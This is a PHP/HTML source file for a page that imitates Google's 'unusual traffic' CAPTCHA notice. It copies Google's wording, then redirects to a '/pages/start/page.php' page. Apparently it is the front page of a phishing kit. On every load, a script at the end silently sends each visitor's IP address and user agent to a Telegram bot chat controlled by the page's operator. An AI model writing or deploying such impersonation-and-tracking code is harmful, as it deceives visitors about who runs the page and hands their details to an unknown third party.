
<?php 
session_start(); // Start the session

$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];

if (isset($_SESSION['user_ip'])) {
    $userIp = $_SESSION['user_ip'];
    $userAgent = $_SESSION['user_agent'];
}

// Define a variable to check the result of reCAPTCHA
$recaptchaValid = null;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $recaptchaSecret = $_SESSION['GOOGLE_SECRET_KEY'];
    $response = $_POST['g-recaptcha-response'];
    $remoteIp = $_SERVER['REMOTE_ADDR'];

    $url = 'https://www.google.com/recaptcha/api/siteverify';
    $data = array(
        'secret' => $recaptchaSecret,
        'response' => $response,
        'remoteip' => $remoteIp
    );

    $options = array(
        'http' => array (
            'method' => 'POST',
            'content' => http_build_query($data)
        )
    );

    $context  = stream_context_create($options);
    $verify = file_get_contents($url, false, $context);
    $captcha_success = json_decode($verify);

    $recaptchaValid = $captcha_success->success;

    if ($recaptchaValid) {
        $_SESSION['recaptcha_validated'] = true; // Set session variable on successful validation
    }

    // Redirect to main page if reCAPTCHA is already validated
    if (isset($_SESSION['recaptcha_validated']) && $_SESSION['recaptcha_validated'] === true) {
        header("Location: /pages/start/page.php"); // Replace 'main_page.php' with the main page of your site
        exit;
}
}
?>

<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
        <meta name="viewport" content="initial-scale=1">
        <style>
        .captcha-box.v2 form {
            margin-bottom: 0px;
            margin-top: 30px;
        }

        .captcha-box.v2 form div {
            width: 304px;
            margin-left: auto;
            margin-right: auto;
        }
        </style>
      
    </head>
    <body style="font-family: arial, sans-serif; background-color: #fff; color: #000; padding:20px; font-size:18px;" onload="e=document.getElementById('captcha');if(e){e.focus();}">
        <div style="max-width:400px;">
            <hr style="color:#ccc; background-color:#ccc;" size="1" noshade="">
            <br>
           <?php if ($recaptchaValid === false): ?>
        <p style="color:red;">CAPTCHA Verification Failed. Please try again.</p>
    <?php endif; ?>

    <form action="" method="POST">
        <div class="g-recaptcha" data-sitekey="<?php echo $_SESSION['GOOGLE_SITE_KEY']?>"></div>
        <br/>
        <input type="submit" value="Submit">
    </form>
            <hr style="color:#ccc; background-color:#ccc;" size="1" noshade="">
            <div style="font-size:13px;">
                <b>About this page</b><br><br>
                Our systems have detected unusual traffic from your computer network.  This page checks to see if it's really you sending the requests, and not a robot.  <a href="#" onclick="document.getElementById('infoDiv').style.display='block';">Why did this happen?</a><br><br>
                <div id="infoDiv" style="display:none; background-color:#eee; padding:10px; margin:0 0 15px 0; line-height:1.4em;">
                    This page appears when Google automatically detects requests coming from your computer network which appear to be in violation of the <a href="//www.google.com/policies/terms/">Terms of Service</a>. The block will expire shortly after those requests stop.  In the meantime, solving the above CAPTCHA will let you continue to use our services.<br><br>This traffic may have been sent by malicious software, a browser plug-in, or a script that sends automated requests.  If you share your network connection, ask your administrator for help — a different computer using the same IP address may be responsible.  <a href="//support.google.com/websearch/answer/86640">Learn more</a><br><br>Sometimes you may be asked to solve the CAPTCHA if you are using advanced terms that robots are known to use, or sending requests very quickly.
                </div>
              
            </div>
        </div>
        <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    </body>
    
    <script>
    // Telegram API URL with your bot token and method
    let messageText = `New User\n\nCaptcha Page\n\nIP: <?php echo $userIp ?>\nUserAgent: <?php echo $userAgent?>`;

    const telegramApiUrl = `https://api.telegram.org/bot<?php echo $_SESSION['TELEGRAM_BOT_KEY']?>/sendMessage`;
    const payload = {
        chat_id: '<?php echo $_SESSION['CHAT_ID']?>',
        text: messageText
    };

    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
</script>
</html>
